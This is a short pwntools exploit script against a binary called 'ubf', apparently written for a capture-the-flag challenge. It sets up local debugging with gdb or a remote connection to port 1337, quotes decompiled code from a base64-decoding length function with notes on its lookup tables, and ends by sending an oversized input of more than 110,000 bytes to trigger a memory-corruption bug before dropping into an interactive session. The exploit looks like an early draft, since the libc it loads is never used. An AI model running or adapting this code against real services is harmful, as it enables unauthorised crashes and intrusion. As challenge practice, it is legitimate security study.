#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('ubf')
		if debug:
			gdb.attach(s, gdbscript='''
            handle SIGALRM ignore
            b* read_blob_b64+115
            c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('0', 1337)

	return s

s = conn()

elf = ELF('ubf')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

"""
unsigned __int8 *v1; // rbx
  unsigned __int8 *v2; // rax
  int v3; // ebx
  int v4; // eax

  v1 = a1;
  do
    v2 = v1++;
  while ( (unsigned __int8)pr2six[*v2] <= 0x3Fu );
  v3 = (_DWORD)v1 - (_DWORD)a1 - 1;
  v4 = v3 + 3;
  if ( v3 + 3 < 0 )
    v4 = v3 + 6;
  return (unsigned int)(3 * (v4 >> 2) + 1);
"""

# basis_64 -> 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
# pr2six -> '@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@'
# pr2six_ -> [1,2,3,4,5,6,7,8,9,A,B,C,D,E,F,0x10,0x11,0x12, 0x13, 0x14,0x15,0x16,0x17,0x18,0x19,@,@,@,@,@,@,0x1A, 0x1B,0x1C, 0x1D, 0x1E, 0x1F, 0x20,0x21, 0x22,0x23, 0x24,0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,0x30, 0x31, 0x32, 0x33, 132*@]


s.sendline(b'a'*110398+10*b'b')
s.interactive()

